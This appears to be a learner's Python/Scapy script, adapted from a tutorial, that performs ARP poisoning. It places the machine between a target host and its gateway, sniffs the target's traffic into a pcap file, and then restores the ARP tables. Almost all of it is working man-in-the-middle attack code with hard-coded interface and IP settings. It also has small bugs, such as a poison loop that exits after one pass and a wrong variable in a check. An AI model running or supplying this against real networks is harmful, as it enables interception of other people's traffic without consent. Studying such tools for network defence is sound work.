#!/usr/bin/python
# Before Running this you need to update the interface, target_ip, and gateway_ip
# Then run echo 1 > /proc/sys/net/ipv4/ip_forward or sudo sysctl -w net.inet.ip.forwarding=1 to tell our local
# machine that we can forward packets along to both the gateway and target ip address. Two arp replies
# can be seen in the wiresharke capture that gets generated in the same directory as this file.
# The ARP dmacs are the target host and the gateway and source mac is the host of the MiTM machine

from scapy.all import *
import os
import sys
import threading
import signal

interface = "wlan0"
target_ip = "192.168.1.10"
gateway_ip = "192.168.1.1"
packet_count = 10000


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

    # slightly different method using send
    print "[*] Restoring target ..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print "[*] ARP poison attack finished."
        return


# set our intertface
conf.iface = interface

# turn off output
conf.verb = 0

print "[*] Setting up %s" % interface


# 1 - Resolve the Gateway mac address
# different than tutorial
gateway_mac = getmacbyip(gateway_ip)

if gateway_ip is None:
    print "[!!!] Failed to get MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)


# note different than tutorial
# 2- Resolve Target mac address
target_mac = getmacbyip(target_ip)

if target_mac is None:
    print "[!!!} Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip, target_mac)

# 3 - Start Spin up second thread to start arp poisioning attack
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_filter = "ip host %s" % target_ip

    # 4 - start a sniffer to capture a preset amount of packets using BPF filter to only capture for our IP
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    # 5 write out the captured packets
    wrpcap('arper.pcap', packets)


# 6 - When attack is finished we cann our restore_target function which is responsible for putting
# the network back the was it was before the ARP poisioning
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)